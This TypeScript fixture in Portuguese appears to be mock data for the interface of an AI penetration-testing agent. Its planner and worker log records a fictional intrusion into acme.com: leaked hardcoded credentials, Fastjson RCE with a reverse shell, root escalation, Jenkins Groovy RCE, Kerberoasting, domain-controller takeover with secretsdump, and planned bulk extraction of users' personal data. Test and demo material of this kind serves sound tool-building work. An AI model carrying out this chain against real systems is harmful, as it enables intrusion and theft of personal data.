      payload: P({ summary: "Vazamento de código por .git em www.acme.com e extração de credenciais fixas" }),
      priority: 7,
      state: "done",
      origin: "planner",
      ts: T("2026-07-25T20:20:00Z"),
    },

    // ── Camada 2 · rompendo a DMZ e estabelecendo um ponto de apoio ──
    {
      id: "i6",
      type: "intent",
      payload: P({ summary: "Impressão digital dos componentes de shop.acme.com e correlação com CVEs" }),
      priority: 7,
      state: "done",
      origin: "planner",
      ts: T("2026-07-25T14:20:00Z"),
    },
    {
      id: "i7",
      type: "intent",
      payload: P({ summary: "Disparar o RCE por desserialização na loja e obter shell reverso" }),
      priority: 9,
      state: "done",
      origin: "planner",
      ts: T("2026-07-25T15:10:00Z"),
    },
    {
      id: "i8",
      type: "intent",
      payload: P({ summary: "Coleta local no ponto de apoio da DMZ e elevação a root" }),
      priority: 8,
      state: "done",
      origin: "planner",
      ts: T("2026-07-25T16:00:00Z"),
    },

    // ── Camada 3 · aprofundamento lateral na rede interna (testes em várias camadas) ──
    {
      id: "i9",
      type: "intent",
      payload: P({ summary: "Usar o ponto de apoio como pivô para descobrir hosts internos" }),
      priority: 8,
      state: "done",
      origin: "planner",
      ts: T("2026-07-25T20:30:00Z"),
    },
    {
      id: "i10",
      type: "intent",
      payload: P({ summary: "Reuso de credenciais e password spraying na rede interna" }),
      priority: 8,
      state: "running",
      origin: "planner",
      ts: T("2026-07-26T03:40:00Z"),
    },
    {
      id: "i11",
      type: "intent",
      payload: P({ summary: "Jenkins interno: execução de script Groovy sem autenticação (RCE)" }),
      priority: 9,
      state: "done",
      origin: "planner",
      ts: T("2026-07-25T21:30:00Z"),
    },
    {
      id: "i12",
      type: "intent",
      payload: P({ summary: "Kerberoasting das contas de serviço do domínio e quebra offline" }),
      priority: 8,
      state: "done",
      origin: "planner",
      ts: T("2026-07-25T22:40:00Z"),
    },
    {
      id: "i13",
      type: "intent",
      payload: P({ summary: "Entrar com credencial de administrador de domínio e controlar o DC01" }),
      priority: 10,
      state: "done",
      origin: "planner",
      ts: T("2026-07-25T23:50:00Z"),
    },

    // ── Fatos ──
    {
      id: "fa1",
      type: "fact",
      payload: P({ summary: "Subdomínio admin.acme.com encontrado (painel em Element-UI)" }),
      priority: 0,
      state: "open",
      origin: "work#1",
      ts: T("2026-07-24T09:40:00Z"),
    },
    {
      id: "fa2",
      type: "fact",
      payload: P({ summary: "O parâmetro q da busca é ponto de injeção baseada em erro (MSSQL)" }),
      priority: 0,
      state: "open",
      origin: "work#4",
      ts: T("2026-07-25T22:05:00Z"),
    },
    {
      id: "faGit",
      type: "fact",
      payload: P({ summary: ".git acessível; o git-dumper reconstruiu o código do backend" }),
      priority: 0,
      state: "open",
      origin: "workG",
      ts: T("2026-07-25T20:30:00Z"),
    },
    {
      id: "faCreds",
      type: "fact",
      payload: P({
        summary: "config.php traz a senha do banco fixa: sa / Acme@2021 (provavelmente reutilizada na rede interna)",
      }),
      priority: 0,
      state: "open",
      origin: "workG",
      ts: T("2026-07-25T20:35:00Z"),
    },
    {
      id: "fa3",
      type: "fact",
      payload: P({ summary: "A loja usa Fastjson 1.2.24 (RCE por desserialização conhecido)" }),
      priority: 0,
      state: "open",
      origin: "work#6",
      ts: T("2026-07-25T14:40:00Z"),
    },
    {
      id: "fa4",
      type: "fact",
      payload: P({ summary: "Shell reverso estabelecido: www-data@dmz-web01 (10.0.20.15), na faixa da DMZ" }),
      priority: 0,
      state: "open",
      origin: "work#7",
      ts: T("2026-07-25T15:40:00Z"),
    },
    {
      id: "fa5",
      type: "fact",
      payload: P({ summary: "sudo -l: (ALL) NOPASSWD: /usr/bin/python3 → permite elevar a root" }),
      priority: 0,
      state: "open",
      origin: "work#8",
      ts: T("2026-07-25T16:20:00Z"),
    },
    {
      id: "fa6",
      type: "fact",
      payload: P({
        summary: "A segunda placa do ponto de apoio alcança a rede interna 10.10.10.0/24 (atravessa a borda da DMZ)",
      }),
      priority: 0,
      state: "open",
      origin: "work#9",
      ts: T("2026-07-25T20:40:00Z"),
    },
    {
      id: "fa7",
      type: "fact",
      payload: P({
        summary:
          "Hosts ativos na rede interna: 10.10.10.10 DC01 (controlador de domínio) / 10.10.10.5 FS01 (SMB) / 10.10.10.20 JENKINS",
      }),
      priority: 0,
      state: "open",
      origin: "work#9",
      ts: T("2026-07-25T21:00:00Z"),
    },
    {
      id: "fa8",
      type: "fact",
      payload: P({ summary: "O console /script do JENKINS não exige autenticação e executa Groovy direto" }),
      priority: 0,
      state: "open",
      origin: "work#11",
      ts: T("2026-07-25T21:45:00Z"),
    },
    {
      id: "fa9",
      type: "fact",
      payload: P({
        summary: "Senha em texto claro da conta de domínio acme\\svc_deploy exportada do cofre do Jenkins",
      }),
      priority: 0,
      state: "open",
      origin: "work#11",
      ts: T("2026-07-25T22:10:00Z"),
    },
    {
      id: "fa10",
      type: "fact",
      payload: P({ summary: "TGS de svc_sql obtido por Kerberoast; o hashcat quebrou a senha Sql@2020" }),
      priority: 0,
      state: "open",
      origin: "work#12",
      ts: T("2026-07-25T23:20:00Z"),
    },

    // ── Vulnerabilidades ──
    {
      id: "fi1",
      type: "finding",
      payload: P({ summary: "Senha padrão do painel: admin/admin123" }),
      priority: 0,
      state: "confirmed",
      origin: "work#2",
      ts: T("2026-07-26T03:50:00Z"),
    },
    {
      id: "fi2",
      type: "finding",
      payload: P({ summary: "Injeção de SQL (parâmetro q da busca) permite ler o banco acme_prod" }),
      priority: 0,
      state: "confirmed",
      origin: "work#4",
      ts: T("2026-07-26T01:20:00Z"),
    },
    {
      id: "fi3",
      type: "finding",
      payload: P({ summary: "IDOR: /v1/orders?id= permite ler pedidos de outras pessoas" }),
      priority: 0,
      state: "confirmed",
      origin: "work#5",
      ts: T("2026-07-26T02:44:00Z"),
    },
    {
      id: "fiSrc",
      type: "finding",
      payload: P({ summary: "Vazamento de código-fonte + credencial de banco fixa (sa/Acme@2021)" }),
      priority: 0,
      state: "confirmed",
      origin: "workG",
      ts: T("2026-07-25T20:36:00Z"),
    },
    {
      id: "fiRce",
      type: "finding",
      payload: P({ summary: "RCE por desserialização do Fastjson na loja: execução de comandos no servidor" }),
      priority: 0,
      state: "confirmed",
      origin: "work#7",
      ts: T("2026-07-25T15:40:00Z"),
    },
    {
      id: "fiPriv",
      type: "finding",
      payload: P({ summary: "Elevação local a root no ponto de apoio da DMZ (sudo NOPASSWD mal configurado)" }),
      priority: 0,
      state: "confirmed",
      origin: "work#8",
      ts: T("2026-07-25T16:20:00Z"),
    },
    {
      id: "fiJenkins",
      type: "finding",
      payload: P({ summary: "Jenkins interno sem autenticação com Groovy → RCE no servidor" }),
      priority: 0,
      state: "confirmed",
      origin: "work#11",
      ts: T("2026-07-25T21:50:00Z"),
    },
    {
      id: "fiKerb",
      type: "finding",
      payload: P({ summary: "Kerberoasting quebrou a senha da conta de serviço svc_sql" }),
      priority: 0,
      state: "confirmed",
      origin: "work#12",
      ts: T("2026-07-25T23:20:00Z"),
    },
    {
      id: "fiDC",
      type: "finding",
      payload: P({ summary: "Controlador de domínio DC01 dominado (Domain Admin) — alvo interno atingido" }),
      priority: 0,
      state: "confirmed",
      origin: "work#13",
      ts: T("2026-07-26T00:20:00Z"),
    },

    // ── Dicas (injetadas pelo agent principal) ──
    {
      id: "h1",
      type: "hint",
      payload: P({ summary: "O painel é Element-UI; comece pela lista de senhas padrão" }),
      priority: 5,
      state: "consumed",
      origin: "mainagent",
      ts: T("2026-07-26T03:20:00Z"),
    },
    {
      id: "h2",
      type: "hint",
      payload: P({ summary: "Na rede interna, priorize o Jenkins: /script sem autenticação dá RCE por Groovy" }),
      priority: 6,
      state: "consumed",
      origin: "mainagent",
      ts: T("2026-07-25T21:20:00Z"),
    },
    {
      id: "h3",
      type: "hint",
      payload: P({
        summary: "Leve a senha de banco do código-fonte para spraying interno; provavelmente é reutilizada",
      }),
      priority: 6,
      state: "consumed",
      origin: "mainagent",
      ts: T("2026-07-25T23:10:00Z"),
    },
  ],
  edges: [
    // raiz → objetivo
    { src: "root", dst: "g1", rel: "spawns" },
    { src: "root", dst: "g2", rel: "spawns" },
    { src: "root", dst: "g3", rel: "spawns" },
    { src: "root", dst: "g4", rel: "spawns" },
    // objetivo → intenção
    { src: "g1", dst: "i1", rel: "spawns" },
    { src: "g1", dst: "i2", rel: "spawns" },
    { src: "g1", dst: "i3", rel: "spawns" },
    { src: "g2", dst: "i4", rel: "spawns" },
    { src: "g2", dst: "i5", rel: "spawns" },
    { src: "g2", dst: "ig", rel: "spawns" },
    { src: "g3", dst: "i6", rel: "spawns" },
    { src: "g3", dst: "i7", rel: "spawns" },
    { src: "g3", dst: "i8", rel: "spawns" },
    { src: "g4", dst: "i9", rel: "spawns" },
    { src: "g4", dst: "i10", rel: "spawns" },
    { src: "g4", dst: "i11", rel: "spawns" },
    { src: "g4", dst: "i12", rel: "spawns" },
    { src: "g4", dst: "i13", rel: "spawns" },
    // intenção → fato / vulnerabilidade (produção)
    { src: "i1", dst: "fa1", rel: "yields" },
    { src: "i4", dst: "fa2", rel: "yields" },
    { src: "i2", dst: "fi1", rel: "yields" },
    { src: "i4", dst: "fi2", rel: "yields" },
    { src: "i5", dst: "fi3", rel: "yields" },
    { src: "ig", dst: "faGit", rel: "yields" },
    { src: "ig", dst: "faCreds", rel: "yields" },
    { src: "ig", dst: "fiSrc", rel: "yields" },
    { src: "i6", dst: "fa3", rel: "yields" },
    { src: "i7", dst: "fa4", rel: "yields" },
    { src: "i7", dst: "fiRce", rel: "yields" },
    { src: "i8", dst: "fa5", rel: "yields" },
    { src: "i8", dst: "fiPriv", rel: "yields" },
    { src: "i9", dst: "fa6", rel: "yields" },
    { src: "i9", dst: "fa7", rel: "yields" },
    { src: "i11", dst: "fa8", rel: "yields" },
    { src: "i11", dst: "fa9", rel: "yields" },
    { src: "i11", dst: "fiJenkins", rel: "yields" },
    { src: "i12", dst: "fa10", rel: "yields" },
    { src: "i12", dst: "fiKerb", rel: "yields" },
    { src: "i13", dst: "fiDC", rel: "yields" },
    // fato → nova intenção (avanço em várias camadas dirigido por fatos)
    { src: "fa3", dst: "i7", rel: "derived_from" },
    { src: "fa4", dst: "i8", rel: "derived_from" },
    { src: "fa4", dst: "i9", rel: "derived_from" },
    { src: "faCreds", dst: "i10", rel: "derived_from" },
    { src: "fa7", dst: "i11", rel: "derived_from" },
    { src: "fa7", dst: "i12", rel: "derived_from" },
    { src: "fa9", dst: "i13", rel: "derived_from" },
    { src: "fa10", dst: "i13", rel: "derived_from" },
    // dica → intenção
    { src: "h1", dst: "i2", rel: "derived_from" },
    { src: "h2", dst: "i11", rel: "derived_from" },
    { src: "h3", dst: "i10", rel: "derived_from" },
    // vulnerabilidade → prova de que o objetivo foi atingido
    { src: "fi1", dst: "g1", rel: "proves" },
    { src: "fiRce", dst: "g3", rel: "proves" },
    { src: "fiDC", dst: "g4", rel: "proves" },
  ],
};

export const intents: TaskNode[] = explorationGraph.nodes.filter((n) => n.type === "intent");
export const frontier: TaskNode[] = explorationGraph.nodes.filter(
  (n) => n.type === "intent" && (n.state === "open" || n.state === "running"),
);

// ── Activity (processo de execução) ──────────────────────────────────────────────────
// As sessões são derivadas das "intenções" pelo sessions-tab (session.id = intent.id), e o transcript = fluxo de atividades que casa com
// intent_id. planner = worker "planner", agent principal = worker "mainagent".
// Cada sessão de worker contém a cadeia completa de execução de ferramentas (tool_use → tool_result → … → result).
export const activity: Activity[] = [
  // planner — cadeia de decisão completa de cada rodada: ler a situação → puxar a saída dos workers para comparar → julgar objetivos → add_intent despacha direções
  // ── Rodada 0 · decomposição de objetivos e primeiras intenções (2026-07-24 09:12) ──
  {
    seq: 1000,
    worker: "planner",
    ts: T("2026-07-24T09:12:10Z"),
    kind: "round",
    summary: "Rodada 0 · decomposição dos objetivos",
  },
  {
    seq: 1001,
    worker: "planner",
    ts: T("2026-07-24T09:12:25Z"),
    kind: "thinking",
    summary:
      'graph_overview: a camada de objetivos já decompôs as metas — g1 "obter acesso de administrador ao painel de acme.com" e g2 "ler dados sensíveis de usuários", ambas em aberto; facts=0 e recent_facts vazio (o grafo está praticamente em branco, nenhum worker produziu nada ainda). Os ativos no escopo são só o domínio raiz acme.com e uma faixa /24. Primeira leitura da superfície de ataque: cinco entradas — www, admin, api, shop e vpn. Como não há nenhum fato no grafo, só posso fazer [sondagem leve, somente leitura] para descrever as intenções iniciais com precisão; de jeito nenhum executo o trabalho dentro do plano.',
  },
  {
    seq: 1002,
    worker: "planner",
    ts: T("2026-07-24T09:12:40Z"),
    kind: "tool_use",
    tool: "bash",
    tool_use_id: "p0-probe",
    summary: "curl -sI https://acme.com; curl -sI https://admin.acme.com",
    detail:
      "O cenário inicial está quase vazio: faço no máximo 3 sondagens somente de leitura para calibrar a direção das intenções (sem enumerar nem validar, que é trabalho do worker).",
  },
  {
    seq: 1003,
    worker: "planner",
    ts: T("2026-07-24T09:12:52Z"),
    kind: "tool_result",
    tool: "bash",
    tool_use_id: "p0-probe",
    summary:
      "acme.com → 302 → www; Server: nginx/1.24.0\nadmin.acme.com → 200, sem X-Powered-By, corpo com assinatura de element-ui/vue",
    detail:
      "O admin é uma página de login separada; as cinco entradas se confirmam, então dá para descrever as intenções iniciais com precisão.",
  },
  {
    seq: 1004,
    worker: "planner",
    ts: T("2026-07-24T09:13:00Z"),
    kind: "tool_use",
    tool: "add_intent",
    tool_use_id: "p0-ai",
    summary: "add_intent × 4 (primeiro lote de direções de exploração)",
    detail:
      "intents=[\n  { summary: 'Enumeração completa de subdomínios de acme.com + identificação de portas e serviços nos hosts ativos, para mapear a superfície de ataque', asset_ids: [acme.com], priority: 6 },\n  { summary: 'Teste de senha padrão e senha fraca no painel admin.acme.com (login Element-UI, sem captcha)', asset_ids: [admin], priority: 9 },\n  { summary: 'Sondagem de injeção de SQL no parâmetro q de www.acme.com/search', asset_ids: [www], priority: 8 },\n  { summary: 'Teste de IDOR no endpoint de pedidos de api.acme.com', asset_ids: [api], priority: 8 },\n]\nparent_ids vazios em todas (direções novas de topo; na falta de pai, ligam ao fato de origem).",
  },
  {
    seq: 1005,
    worker: "planner",
    ts: T("2026-07-24T09:13:02Z"),
    kind: "tool_result",
    tool: "add_intent",
    tool_use_id: "p0-ai",
    summary: "4 intents created → ids=[i1, i2, i4, i5], já ligadas à fronteira",
    detail:
      "Mantenho as rotas deliberadamente variadas: i1 de reconhecimento, i2 na linha de autenticação (g1) e i4/i5 na linha de dados (g2) — dois mecanismos independentes em paralelo, sem convergir cedo demais.",
  },
  {
    seq: 1006,
    worker: "planner",
    ts: T("2026-07-24T09:13:05Z"),
    kind: "text",
    summary:
      "Esta rodada derivou as 4 primeiras intenções: i1 reconhecimento de ativos, i2 senha do painel, i4 injeção e i5 escalada na API. O g1 segue por i2 e o g2 por i4/i5, cada objetivo com sua própria entrada em andamento. Quando os workers produzirem fatos, reforço conforme a linhagem.",
  },

  // ── Rodada 1 · aumento da superfície de ataque (2026-07-25 14:12) ──
  {
    seq: 1100,
    worker: "planner",
    ts: T("2026-07-25T14:12:00Z"),
    kind: "round",
    summary: "Rodada 1 · ampliação da superfície de ataque",
  },
  {
    seq: 1101,
    worker: "planner",
    ts: T("2026-07-25T14:12:15Z"),
    kind: "thinking",
    summary:
      'Comparando com recent_facts: o workG devolveu faGit "o .git é baixável e o git-dumper reconstruiu o código do backend" e faCreds "config.php traz sa/Acme@2021 fixo no código (provavelmente reutilizado na rede interna)"; a impressão digital do work#6 devolveu fa3 "a loja usa Fastjson 1.2.24 (RCE por desserialização conhecido)". Dois [mecanismos novos e concretos]: (1) a senha de banco fixa no código pode valer dentro da rede interna; (2) o Fastjson tem exploração madura de RCE. Isso abre uma entrada [essencialmente diferente] das rotas de autenticação e injeção atuais: romper direto para a DMZ via RCE na loja. Primeiro puxo o detalhe de faGit para conferir o que saiu.',
  },
  {
    seq: 1102,
    worker: "planner",
    ts: T("2026-07-25T14:12:28Z"),
    kind: "tool_use",
    tool: "node_detail",
    tool_use_id: "p1-nd",
    summary: "node_detail(faGit) — conferir o que o workG reconstruiu do código-fonte",
    detail:
      "Antes do add_intent, ver o que o worker de fato reconstruiu, para não supor a direção só pela impressão digital.",
  },
  {
    seq: 1103,
    worker: "planner",
    ts: T("2026-07-25T14:12:35Z"),
    kind: "tool_result",
    tool: "node_detail",
    tool_use_id: "p1-nd",
    summary:
      "Evidência de faGit: o git-dumper reconstruiu config.php, db.php e order_api.php; em config.php está $db=['host'=>'10.10.10.5','user'=>'sa','pass'=>'Acme@2021']",
    detail:
      "O valor fixo aponta para 10.10.10.5 (FS01) na rede interna, o que sustenta a hipótese de faCreds sobre reuso interno: assim que o RCE se firmar, vale testar essa senha.",
  },
  {
    seq: 1104,
    worker: "planner",
    ts: T("2026-07-25T14:12:50Z"),
    kind: "tool_use",
    tool: "add_intent",
    tool_use_id: "p1-ai",
    summary: "add_intent × 2 (cadeia de ruptura via Fastjson: cadeia serial, envio só o passo já executável)",
    detail:
      "intents=[\n  { summary: 'Aprofundar a impressão digital dos componentes de shop.acme.com + correlacionar com precisão o CVE do Fastjson 1.2.24 (confirmar a cadeia de gadgets)', asset_ids: [shop], parent_ids: [fa3], priority: 7 },\n  { summary: 'Montar o payload de desserialização do Fastjson para disparar RCE na loja e obter shell reverso', asset_ids: [shop], parent_ids: [fa3], priority: 9 },\n]\nObs.: é uma cadeia serial de dependência forte. Já registrei no TodoWrite os três passos 'impressão digital → RCE → elevação no ponto de apoio'; nesta rodada envio só os dois primeiros (a elevação depende do shell, fica para a próxima).",
  },
  {
    seq: 1105,
    worker: "planner",
    ts: T("2026-07-25T14:12:52Z"),
    kind: "tool_result",
    tool: "add_intent",
    tool_use_id: "p1-ai",
    summary: "2 intents created → ids=[i6, i7], ligadas à linhagem por fa3",
  },
  {
    seq: 1106,
    worker: "planner",
    ts: T("2026-07-25T14:13:00Z"),
    kind: "text",
    summary:
      'O cenário mudou de patamar: código-fonte + senha interna fixa no código + RCE no Fastjson formam uma rota de ruptura inédita. Pedi à camada de objetivos que registrasse g3 "romper a DMZ a partir da internet e firmar um ponto de apoio interno" e enviei i6 (impressão digital e CVE) e i7 (disparar o RCE). A elevação na DMZ depende do shell; fica nos pendentes para a próxima rodada.',
  },

  // ── Rodada 2 · ponto de apoio estabelecido, migrando para a rede interna (2026-07-25 20:25) ──
  {
    seq: 1200,
    worker: "planner",
    ts: T("2026-07-25T20:25:00Z"),
    kind: "round",
    summary: "Rodada 2 · ponto de apoio firmado, virando para a rede interna",
  },
  {
    seq: 1201,
    worker: "planner",
    ts: T("2026-07-25T20:25:18Z"),
    kind: "thinking",
    summary:
      'Pela linhagem: i7 devolveu fa4 "shell reverso www-data@dmz-web01 (10.0.20.15), na faixa da DMZ"; a cadeia de elevação devolveu fa5 "sudo -l casa com NOPASSWD python3 → permite elevar a root" e fa6 "a segunda placa do ponto de apoio alcança a rede interna 10.10.10.0/24". Os critérios de aceite de g3 (romper a DMZ e firmar o ponto de apoio) são atendidos diretamente por fa4 + fa6. Confirmo o alcance interno de fa6 antes de chamar prove_goal.',
  },
  {
    seq: 1202,
    worker: "planner",
    ts: T("2026-07-25T20:25:30Z"),
    kind: "tool_use",
    tool: "node_detail",
    tool_use_id: "p2-nd",
    summary: "node_detail(fa6) — confirmar as duas placas de rede e o alcance interno",
  },
  {
    seq: 1203,
    worker: "planner",
    ts: T("2026-07-25T20:25:38Z"),
    kind: "tool_result",
    tool: "node_detail",
    tool_use_id: "p2-nd",
    summary:
      "Evidência de fa6: ip a → eth0 10.0.20.15 (DMZ) / eth1 10.10.10.15 (rede interna); o ping para 10.10.10.10 responde, confirmando a travessia da borda da DMZ",
  },
  {
    seq: 1204,
    worker: "planner",
    ts: T("2026-07-25T20:25:50Z"),
    kind: "tool_use",
    tool: "prove_goal",
    tool_use_id: "p2-pg",
    summary: "prove_goal(g3, evidence=fa6)",
    detail:
      'reason: o RCE de i7 rendeu o ponto de apoio na DMZ (fa4), fa5 elevou a root e fa6 provou que a segunda placa alcança a rede interna e responde ao ping do DC01 — o critério "romper a DMZ e firmar um ponto de apoio interno" está atendido.',
  },
  {
    seq: 1205,
    worker: "planner",
    ts: T("2026-07-25T20:25:52Z"),
    kind: "tool_result",
    tool: "prove_goal",
    tool_use_id: "p2-pg",
    summary: "goal g3 → met (evidência fa6 ligada); g1, g2 e g4 seguem em aberto, a tarefa continua",
  },
  {
    seq: 1206,
    worker: "planner",
    ts: T("2026-07-25T20:26:10Z"),
    kind: "tool_use",
    tool: "add_intent",
    tool_use_id: "p2-ai",
    summary: "add_intent × 4 (movimentação lateral interna usando o ponto de apoio como pivô)",
    detail:
      "intents=[\n  { summary: 'Descoberta de hosts e identificação de portas em 10.10.10.0/24, usando dmz-web01 como pivô', asset_ids: [dmz-web01], parent_ids: [fa6], priority: 8 },\n  { summary: 'Movimentação lateral interna: reusar a senha fixa sa/Acme@2021 em password spraying', parent_ids: [faCreds], priority: 8 },\n  { summary: 'Jenkins interno (10.10.10.20): execução Groovy em /script sem autenticação (RCE)', parent_ids: [fa6], priority: 9 },\n  { summary: 'Kerberoasting das contas de serviço do domínio e quebra offline', parent_ids: [fa6], priority: 8 },\n]\nA descoberta de hosts é pré-requisito (vai primeiro); as outras três são dimensões paralelas de exploração lateral.",
  },
  {
    seq: 1207,
    worker: "planner",
    ts: T("2026-07-25T20:26:12Z"),
    kind: "tool_result",
    tool: "add_intent",
    tool_use_id: "p2-ai",
    summary: "4 intents created → ids=[i9, i10, i11, i12]",
  },
  {
    seq: 1208,
    worker: "planner",
    ts: T("2026-07-25T20:26:20Z"),
    kind: "text",
    summary:
      'g3 atingido; a superfície de ataque passa da internet para a rede interna. Pedi o registro de g4 "movimentação lateral interna até dominar o alvo DC01" e enviei i9 (descoberta de hosts) mais i10/i11/i12 em paralelo. O reuso de credenciais fica ancorado direto em faCreds: a senha vazada no código externo alimenta a lateralização interna.',
  },

  // ── Rodada 3 · revisão do alvo atingido (2026-07-26 00:25) ──
  {
    seq: 1300,
    worker: "planner",
    ts: T("2026-07-26T00:25:00Z"),
    kind: "round",
    summary: "Rodada 3 · retrospectiva do alvo atingido",
  },
  {
    seq: 1301,
    worker: "planner",
    ts: T("2026-07-26T00:25:16Z"),
    kind: "thinking",
    summary:
      'Produção dos workers nesta rodada: i9 → fa7 "hosts ativos na rede interna: DC01/FS01/JENKINS"; i11 → fa8 "Groovy em /script do Jenkins sem autenticação" + fa9 "senha em texto claro de acme\\svc_deploy exportada do cofre do Jenkins"; i12 → fa10 "TGS de svc_sql por Kerberoast, Sql@2020 quebrada pelo hashcat". svc_deploy pertence a Domain Admins, e i13 já usou essa conta no psexec para dominar o DC01 e rodar secretsdump. O critério de g4 (dominar o DC01) deve estar atendido; confiro a cadeia de evidências do achado antes de carimbar.',
  },
  {
    seq: 1302,
    worker: "planner",
    ts: T("2026-07-26T00:25:30Z"),
    kind: "tool_use",
    tool: "list_findings",
    tool_use_id: "p3-lf",
    summary: "list_findings — conferir a evidência confirmada da queda do DC01",
  },
  {
    seq: 1303,
    worker: "planner",
    ts: T("2026-07-26T00:25:40Z"),
    kind: "tool_result",
    tool: "list_findings",
    tool_use_id: "p3-lf",
    summary:
      'F-09 "controle total do controlador de domínio DC01 / secretsdump exportou os hashes de todo o domínio", crítico (evidência: psexec svc_deploy@10.10.10.10 + dump do NTDS.dit); a cadeia a montante fa9 → fa10 → i13 está completa',
  },
  {
    seq: 1304,
    worker: "planner",
    ts: T("2026-07-26T00:25:52Z"),
    kind: "tool_use",
    tool: "prove_goal",
    tool_use_id: "p3-pg",
    summary: "prove_goal(g4, evidence=F-09)",
    detail:
      'reason: o Jenkins vazou svc_deploy (Domain Admin) → psexec assumiu o DC01 → secretsdump extraiu os hashes de todo o domínio. F-09 está confirmado e o objetivo "dominar o alvo interno DC01" foi atingido.',
  },
  {
    seq: 1305,
    worker: "planner",
    ts: T("2026-07-26T00:25:54Z"),
    kind: "tool_result",
    tool: "prove_goal",
    tool_use_id: "p3-pg",
    summary:
      "goal g4 → met; aviso do sistema: g2 continua em aberto, não é o último objetivo, a tarefa ainda não está encerrada",
  },
  {
    seq: 1306,
    worker: "planner",
    ts: T("2026-07-26T00:26:10Z"),
    kind: "text",
    summary:
      'g4 encerrado: a cadeia da internet até a rede interna está completa (RCE externo → DMZ → rede interna → controlador de domínio). Conferindo uma a uma as direções não cobertas: g2 "ler dados sensíveis de usuários" ainda falta o empurrão final, mas i3 (endpoint de usuários do painel) e i5 (IDOR na API) já cobrem essa direção e as duas estão em execução. Nesta rodada não há [direção nova essencialmente diferente e descoberta] — por contenção, nenhuma intenção nova; aguardo a produção de i3/i5.',
  },

  // ── Rodada 4 · painel administrativo atingido, convergindo g2 (2026-07-26 03:55) ──
  {
    seq: 1400,
    worker: "planner",
    ts: T("2026-07-26T03:55:00Z"),
    kind: "round",
    summary: "Rodada 4 · painel conquistado, fechando o g2",
  },
  {
    seq: 1401,
    worker: "planner",
    ts: T("2026-07-26T03:55:14Z"),
    kind: "thinking",
    summary:
      'Comparando com recent_facts: o work#2 usou o Acme@2021 de faCreds e entrou no painel admin (i2 concluída); o acesso de administrador está nas mãos — o critério de g1 foi atendido, então carimbo com prove_goal. Em seguida faço a [verificação quantitativa]: em g2 "ler dados sensíveis de usuários", até agora i3/i5 só tocaram a superfície dos endpoints e nenhum dado em massa foi obtido de fato; na prática o critério não foi atingido, então prove_goal fica [proibido] e, no lugar, elevo a prioridade das intenções de extração.',
  },
  {
    seq: 1402,
    worker: "planner",
    ts: T("2026-07-26T03:55:26Z"),
    kind: "tool_use",
    tool: "prove_goal",
    tool_use_id: "p4-pg",
    summary: "prove_goal(g1, evidence=fa1)",
    detail:
      "reason: i2 entrou no painel admin (Element-UI) com a senha fixa Acme@2021 vazada externamente e obteve acesso de administrador; g1 atingido.",
  },
  {
    seq: 1403,
    worker: "planner",
    ts: T("2026-07-26T03:55:28Z"),
    kind: "tool_result",
    tool: "prove_goal",
    tool_use_id: "p4-pg",
    summary: "goal g1 → met; ainda em aberto: g2",
  },
  {
    seq: 1404,
    worker: "planner",
    ts: T("2026-07-26T03:55:40Z"),
    kind: "thinking",
    summary:
      'Verificação quantitativa de g2: o objetivo "ler dados sensíveis de usuários" significa obter de fato registros de usuários em massa. Em graph_overview não há nenhum achado do tipo "dados de usuários exportados com sucesso", e i3/i5 seguem em execução sem devolver resultado de extração — na prática, o critério não foi atingido. É terminantemente proibido marcar met adiantado com o argumento de que "já entramos no painel, está quase lá"; sigo enviando intenções para fechar a lacuna.',
  },
  {
    seq: 1405,
    worker: "planner",
    ts: T("2026-07-26T03:55:52Z"),
    kind: "tool_use",
    tool: "add_intent",
    tool_use_id: "p4-ai",
    summary: "add_intent × 2 (fechar a extração de g2, com prioridade elevada)",
    detail:
      "intents=[\n  { summary: 'Já dentro do painel admin: enumerar os endpoints de gestão e exportação de usuários e puxar em massa os campos sensíveis', asset_ids: [admin], parent_ids: [fa1], priority: 9 },\n  { summary: 'IDOR nos pedidos de api.acme.com: percorrer order_id e puxar em massa pedidos e dados pessoais', asset_ids: [api], parent_ids: [fa2], priority: 9 },\n]\nObs.: i3/i5 já estão em execução; nesta rodada reforço com uma descrição de extração mais precisa e prioridade maior (→9), sem duplicar intenções de mesmo sentido.",
  },
  {
    seq: 1406,
    worker: "planner",
    ts: T("2026-07-26T03:55:54Z"),
    kind: "tool_result",
    tool: "add_intent",
    tool_use_id: "p4-ai",
    summary: '2 intents updated → ids=[i3, i5] (prioridade elevada a 9, descrição refinada para "extração em massa")',
  },
  {
    seq: 1407,
    worker: "planner",
    ts: T("2026-07-26T03:55:58Z"),
    kind: "text",
    summary:
      "g1 atingido (3 de 4 já cumpridos: g1, g3 e g4). Em g2 mantenho a verificação quantitativa: entrar no painel não basta, só carimbo com dados de usuários em massa na mão. Já subi i3/i5 para prioridade 9 e refinei como intenções de extração; quando os workers devolverem, a tarefa inteira se encerra.",
  },

  // work#1 · i1 enumeração de subdomínios e varredura de portas (done)
  {
    seq: 10,
    worker: "work#1",
    intent_id: "i1",
    ts: T("2026-07-24T09:20:00Z"),
    kind: "thinking",
    summary:
      "Primeiro reconhecimento passivo dos subdomínios, depois identificação de portas e serviços nos hosts ativos.",
  },
  {
    seq: 11,
    worker: "work#1",
    intent_id: "i1",
    ts: T("2026-07-24T09:20:30Z"),
    kind: "tool_use",
    tool: "bash",
    tool_use_id: "t11",
    summary: "subfinder -d acme.com -silent | httpx -silent -sc -title",
  },
  {
    seq: 12,
    worker: "work#1",
    intent_id: "i1",
    ts: T("2026-07-24T09:22:10Z"),
    kind: "tool_result",
    tool: "bash",
    tool_use_id: "t11",
    summary:
      "www.acme.com [200] Acme Corp\nadmin.acme.com [200] Acme Admin — login\napi.acme.com [401]\nshop.acme.com [200]\nvpn.acme.com [200]",
    detail: "5 subdomínios ativos; o admin é a página de login do painel.",
  },
  {
    seq: 13,
    worker: "work#1",
    intent_id: "i1",
    ts: T("2026-07-24T09:23:00Z"),
    kind: "tool_use",
    tool: "bash",
    tool_use_id: "t12",
    summary: "nmap -sV -T4 -p- 203.0.113.10",
  },
  {
    seq: 14,
    worker: "work#1",
    intent_id: "i1",
    ts: T("2026-07-24T09:26:40Z"),
    kind: "tool_result",
    tool: "bash",
    tool_use_id: "t12",
    summary: "22/tcp ssh OpenSSH 8.9p1\n80/tcp http nginx 1.24.0\n443/tcp https nginx 1.24.0",
    detail: "Portas abertas: 22, 80 e 443.",
  },
  {
    seq: 15,
    worker: "work#1",
    intent_id: "i1",
    ts: T("2026-07-24T09:27:00Z"),
    kind: "tool_use",
    tool: "upsert_asset",
    tool_use_id: "t13",
    summary: "upsert_asset × 6 (subdomínios + serviços)",
  },
  {
    seq: 16,
    worker: "work#1",
